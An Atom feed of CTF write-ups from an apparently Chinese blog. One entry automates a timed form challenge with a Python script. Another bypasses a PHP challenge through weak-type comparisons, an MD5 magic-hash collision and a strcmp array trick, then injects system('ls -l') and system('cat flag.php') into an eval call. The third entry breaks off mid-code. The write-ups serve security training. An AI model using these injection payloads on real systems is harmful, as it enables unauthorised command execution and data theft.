<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Webb</title>
  
  
  <link href="http://webb-l.top/atom.xml" rel="self"/>
  
  <link href="http://webb-l.top/"/>
  <updated>2022-08-24T17:05:02.591Z</updated>
  <id>http://webb-l.top/</id>
  
  <author>
    <name>Webb</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>S2-你够快吗 WriteUp</title>
    <link href="http://webb-l.top/2022/08/25/S2-%E4%BD%A0%E5%A4%9F%E5%BF%AB%E5%90%97-WriteUp/"/>
    <id>http://webb-l.top/2022/08/25/S2-%E4%BD%A0%E5%A4%9F%E5%BF%AB%E5%90%97-WriteUp/</id>
    <published>2022-08-24T16:50:19.000Z</published>
    <updated>2022-08-24T17:05:02.591Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li>从下方的代码可以看出需要我们计算结果发送过去。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>给你一秒你把握住<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span>听说你<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color: green&quot;</span>&gt;</span>单身了十八年<span class="tag">&lt;/<span class="name">a</span>&gt;</span>？<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span>那你<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color: blue&quot;</span>&gt;</span>肯定<span class="tag">&lt;/<span class="name">a</span>&gt;</span>能把这段文字复制下来发给我吧？<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span>VZueaGo7<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;randomstring&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;冲了&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;.&quot;</span>&gt;</span>我不服，再来<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">手速不够可以用工具：</span></span><br><span class="line"><span class="comment">import requests</span></span><br><span class="line"><span class="comment">import re</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li><p>尝试发送正确答案。</p></li><li><p>下方的结果不能正确响应应该是我们缺少参数，尝试加入Cookie。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl -d <span class="string">&quot;randomstring=答案&quot;</span> <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/&quot;</span></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;500 Internal Server Error&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Internal Server Error&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error <span class="keyword">in</span> the application.&lt;/p&gt;</span><br></pre></td></tr></table></figure><ul><li>获取Cookie。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl -v <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/&quot;</span> </span><br><span class="line">...</span><br><span class="line">&lt; Set-Cookie: session=eyJjdGltZSI6MTY2MTM2MDAyNSwicmFuZG9tc3RyaW5nIjoib1VKclN4NzQifQ.YwZXmQ.F2Cg6ksvPrFSUJ4fB5A1azrQxVs; HttpOnly; Path=/</span><br><span class="line">...</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;oUJrSx74&lt;/div&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>提交正确答案。接下来应该需要使用Python。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl -d <span class="string">&quot;randomstring=答案&quot;</span> -b <span class="string">&quot;session=eyJjdGltZSI6MTY2MTM2MDAyNSwicmFuZG9tc3RyaW5nIjoib1VKclN4NzQifQ.YwZXmQ.F2Cg6ksvPrFSUJ4fB5A1azrQxVs&quot;</span> <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/&quot;</span></span><br><span class="line">...</span><br><span class="line">&lt;div style=<span class="string">&quot;text-align: center;&quot;</span>&gt;就这速度还想拿到flag？&lt;/div&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>编写Python代码。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/&quot;</span></span><br><span class="line">// 请求靶机题目和Cookie。</span><br><span class="line">response = requests.get(url)</span><br><span class="line">// 使用正则匹配答案。</span><br><span class="line">answer = re.search(<span class="string">&quot;(\d|[a-z]|[A-Z])&#123;8&#125;&quot;</span>, response.text).group()</span><br><span class="line">// 将答案和Cookie发送到靶机。</span><br><span class="line">result = requests.post(</span><br><span class="line">    url,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;randomstring&quot;</span>: answer</span><br><span class="line">    &#125;,</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;session=&quot;</span> + response.cookies.get(<span class="string">&quot;session&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">// 匹配flag</span><br><span class="line">flag = re.findall(<span class="string">&quot;(flag\&#123;.+\&#125;)&quot;</span>, result.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><ul><li>运行脚本</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ python main.py </span><br><span class="line">flag&#123;4e293a2c-****-****-****-12dc79a1461b&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;从下方的代码可以看出需要我们计算结果发送过去。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight html</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>S2-简单的PHP黑魔法 WriteUp</title>
    <link href="http://webb-l.top/2022/08/25/S2-%E7%AE%80%E5%8D%95%E7%9A%84PHP%E9%BB%91%E9%AD%94%E6%B3%95-WriteUp/"/>
    <id>http://webb-l.top/2022/08/25/S2-%E7%AE%80%E5%8D%95%E7%9A%84PHP%E9%BB%91%E9%AD%94%E6%B3%95-WriteUp/</id>
    <published>2022-08-24T16:14:00.000Z</published>
    <updated>2022-08-24T16:44:54.586Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;passwd.php&quot;</span>;</span><br><span class="line"><span class="comment">// 判断GET请求中是否存在L1参数。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;L1&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$L1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;L1&#x27;</span>];</span><br><span class="line">    <span class="comment">// 这里是 1 级。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Here is level1.&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// 判断$L1变量是否是数字。如果是就结束后面代码。</span></span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$L1</span>) ? <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>) : <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 判断$L1变量是否大于2021。注意：这里的判断和上面的代码出现冲突。</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$L1</span> &gt; <span class="number">2021</span>) &#123;</span><br><span class="line">        <span class="comment">// 恭喜，你通过了level1！</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Congratulations,You pass the level1!&lt;br /&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// 这里是2级。</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Here is level2.&lt;br /&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// 判断GET请求中是否存在L2参数。</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;L2&#x27;</span>]))</span><br><span class="line">            <span class="variable">$L2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;L2&#x27;</span>];</span><br><span class="line">        <span class="comment">// 判断$L2变量是否小&lt;=3并且$L2变量&gt;20000。注意：这里是存在矛盾判断。</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$L2</span>) &lt;= <span class="number">3</span> &amp;&amp; <span class="variable">$L2</span> &gt; <span class="number">20000</span>) &#123;</span><br><span class="line">            <span class="comment">// 恭喜，你通过了level2！</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Congratulations,You pass the level2!&lt;br /&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// 这里是3级。</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Here is level3.&lt;br /&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">// 判断GET请求中是否存在L3参数。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;L3&#x27;</span>]))</span><br><span class="line">                <span class="variable">$md5_1</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line">            <span class="variable">$md5_2</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;L3&#x27;</span>]);</span><br><span class="line">            <span class="comment">// 判断$md5_1的md5值是否等于$md5_2的md5值。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$md5_1</span> == <span class="variable">$md5_2</span>) &#123;</span><br><span class="line">                <span class="comment">// 恭喜，你通过了3级！</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Congratulations,You pass the level3!&lt;br /&gt;&quot;</span>;</span><br><span class="line">                <span class="comment">// 这里是 4 级。</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Here is level 4.&lt;br /&gt;&quot;</span>;</span><br><span class="line">                <span class="comment">// 判断GET请求中是否存在L4参数。</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;L4&#x27;</span>]))</span><br><span class="line">                <span class="variable">$level_4</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;L4&#x27;</span>];</span><br><span class="line">                <span class="comment">// 你不知道我的密码</span></span><br><span class="line">                <span class="comment">// You can&#x27;t know my password</span></span><br><span class="line">                    <span class="comment">// $level_4变量的值 == $level_4_password变量的值。</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="variable">$level_4</span>, <span class="variable">$level_4_password</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// 密码对了，你通过了4级！ </span></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;Password is right,You pass the level4!&lt;br /&gt;&quot;</span>;</span><br><span class="line">                        <span class="comment">// 这里是 5 级。</span></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;Here is level5.&lt;br /&gt;&quot;</span>;</span><br><span class="line">                        <span class="comment">// 判断POST请求中是否存在L5参数。</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;L5&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$level_5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;L5&#x27;</span>];</span><br><span class="line">                            <span class="comment">// 将$level_5变量的值进行拼接。</span></span><br><span class="line">                            <span class="keyword">eval</span>(<span class="string">&quot;print_r(<span class="subst">$level_5</span>);&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;Sorry, you didn&#x27;t pass the level4!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Sorry, you didn&#x27;t pass the level3!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you didn&#x27;t pass the level2!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Sorry, you didn&#x27;t pass the level1!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li>L1参数存在弱类型判断。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/?L1=2022A&quot;</span></span><br><span class="line">...</span><br><span class="line">Here is level1.</span><br><span class="line">Congratulations,You pass the level1!</span><br><span class="line">Here is level2.</span><br><span class="line">Sorry, you didn<span class="string">&#x27;t pass the level2! </span></span><br></pre></td></tr></table></figure><ul><li>L2参数存在弱类型判断。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用1e9。</span></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/?L1=2022A&amp;L2=1e9&quot;</span></span><br><span class="line">Here is level1.</span><br><span class="line">Congratulations,You pass the level1!</span><br><span class="line">Here is level2.</span><br><span class="line">Congratulations,You pass the level2!</span><br><span class="line">Here is level3.</span><br><span class="line">Sorry, you didn<span class="string">&#x27;t pass the level3!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 使用数组。</span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/桌面]</span></span><br><span class="line"><span class="string">└─$ curl &quot;http://你的靶机ID.ctf.nynusec.com/?L1=2022A&amp;L2[]=123&amp;L2[]=99999&quot;</span></span><br><span class="line"><span class="string">Here is level1.</span></span><br><span class="line"><span class="string">Congratulations,You pass the level1!</span></span><br><span class="line"><span class="string">Here is level2.</span></span><br><span class="line"><span class="string">Congratulations,You pass the level2!</span></span><br><span class="line"><span class="string">Here is level3.</span></span><br><span class="line"><span class="string">Sorry, you didn&#x27;</span>t pass the level3!</span><br></pre></td></tr></table></figure><ul><li>L3也是存在弱类型判断，使用md5碰撞绕过。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/?L1=2022A&amp;L2[]=123&amp;L2[]=99999&amp;L3=240610708&quot;</span></span><br><span class="line">Here is level1.</span><br><span class="line">Congratulations,You pass the level1!</span><br><span class="line">Here is level2.</span><br><span class="line">Congratulations,You pass the level2!</span><br><span class="line">Here is level3.</span><br><span class="line">Congratulations,You pass the level3!</span><br><span class="line">Here is level 4.</span><br><span class="line">Sorry, you didn<span class="string">&#x27;t pass the level4!</span></span><br></pre></td></tr></table></figure><ul><li>L4使用数组方式绕过。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/?L1=2022A&amp;L2[]=123&amp;L2[]=99999&amp;L3=240610708&amp;L4[]=&quot;</span></span><br><span class="line">Here is level1.</span><br><span class="line">Congratulations,You pass the level1!</span><br><span class="line">Here is level2.</span><br><span class="line">Congratulations,You pass the level2!</span><br><span class="line">Here is level3.</span><br><span class="line">Congratulations,You pass the level3!</span><br><span class="line">Here is level 4.</span><br><span class="line">Password is right,You pass the level4!</span><br><span class="line">Here is level5.</span><br></pre></td></tr></table></figure><ul><li>L5使用字符拼接方式获取flag。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看的前目录存在什么文件。</span></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl -d <span class="string">&quot;L5=&#x27;&#x27;);system(&#x27;ls -l&#x27;&quot;</span> <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/?L1=2022A&amp;L2[]=123&amp;L2[]=99999&amp;L3=240610708&amp;L4[]=&quot;</span> </span><br><span class="line">Here is level1.</span><br><span class="line">Congratulations,You pass the level1!</span><br><span class="line">Here is level2.</span><br><span class="line">Congratulations,You pass the level2!</span><br><span class="line">Here is level3.</span><br><span class="line">Congratulations,You pass the level3!</span><br><span class="line">Here is level 4.</span><br><span class="line">Password is right,You pass the level4!</span><br><span class="line">Here is level5.</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r-- 1 root root   55 Aug 24 15:43 flag.php</span><br><span class="line">-rw-r--r-- 1 root root 1693 Nov  2  2021 index.php</span><br><span class="line">-rw-r--r-- 1 root root   57 Nov  2  2021 passwd.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取flag.php文件的内容。</span></span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl -d <span class="string">&quot;L5=&#x27;&#x27;);system(&#x27;cat flag.php&#x27;&quot;</span> <span class="string">&quot;http://你的靶机ID.ctf.nynusec.com/?L1=2022A&amp;L2[]=123&amp;L2[]=99999&amp;L3=240610708&amp;L4[]=&quot;</span></span><br><span class="line">Here is level1.</span><br><span class="line">Congratulations,You pass the level1!</span><br><span class="line">Here is level2.</span><br><span class="line">Congratulations,You pass the level2!</span><br><span class="line">Here is level3.</span><br><span class="line">Congratulations,You pass the level3!</span><br><span class="line">Here is level 4.</span><br><span class="line">Password is right,You pass the level4!</span><br><span class="line">Here is level5.</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=flag&#123;ce804e21-****-****-****-2675a90ace92&#125;; </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>S2-备用-你够快么-plus WriteUp</title>
    <link href="http://webb-l.top/2022/08/24/S2-%E5%A4%87%E7%94%A8-%E4%BD%A0%E5%A4%9F%E5%BF%AB%E4%B9%88-plus-WriteUp/"/>
    <id>http://webb-l.top/2022/08/24/S2-%E5%A4%87%E7%94%A8-%E4%BD%A0%E5%A4%9F%E5%BF%AB%E4%B9%88-plus-WriteUp/</id>
    <published>2022-08-24T11:58:37.000Z</published>
    <updated>2022-08-24T12:47:12.128Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><ul><li>从下方的代码可以看出需要我们计算结果发送过去。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>给你一秒你把握住<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span>听说你<span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color: green&quot;</span>&gt;</span>能力堪比人形计算机<span class="tag">&lt;/<span class="name">a</span>&gt;</span>？<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span 